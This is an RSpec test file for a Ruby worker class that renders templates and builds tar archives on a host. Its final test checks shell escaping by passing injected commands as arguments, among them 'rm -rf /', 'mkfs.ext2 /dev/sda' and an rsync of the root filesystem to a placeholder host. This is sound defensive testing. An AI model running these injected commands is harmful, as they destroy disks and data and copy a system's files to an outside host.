require 'spec_helper'

describe CloudModel::Workers::BaseWorker do
  let(:host) { Factory :host }
  subject { CloudModel::Workers::BaseWorker.new host }
  
  describe 'render' do
    it 'should call render_to_string on a new instance of ActionController::Base and pass return value' do
      action_controller = double(ActionController::Base)
      allow(ActionController::Base).to receive(:new).and_return action_controller
      expect(action_controller).to receive(:render_to_string).with(template: 'my_template', locals: {a:1, b:2}).and_return 'rendered template'
      expect(subject.render 'my_template', a: 1, b: 2).to eq 'rendered template'
    end
  end
  
  describe 'build_tar' do
    it 'should execute tar on host' do
      expect(host).to receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2'
    end
    
    it 'should parse boolean parameter' do
      expect(host).to receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 --option /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2', option: true   
    end

    it 'should parse valued parameter' do
      expect(host).to receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 --option test /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2', option: 'test'   
    end
    
    it 'should parse multiplevalued parameter' do
      expect(host).to receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 --option test --option test2 /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2', option: ['test', 'test2']
    end
    
    it 'should only put one - in front of single character options' do
      expect(host).to receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 -j -C test /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2', j: true, C: 'test'
    end
    
    it 'should escape values' do
      expect(host).to receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2\\;\\ mkfs.ext2\\ /dev/sda --option\\;\\ echo\\ /dev/random\\ /etc/passwd\\; test\\;\\ rsync\\ /\\ bad_host:/pirate\\; /mnt/root\\;\\ rm\\ -rf\\ /\\;", "Failed to build tar /inst/image.tar.bz2; mkfs.ext2 /dev/sda").and_return 'ok'
      subject.build_tar '/mnt/root; rm -rf /;', '/inst/image.tar.bz2; mkfs.ext2 /dev/sda', 'option; echo /dev/random /etc/passwd;' => 'test; rsync / bad_host:/pirate;'
    end
    
    
  end
  
  
end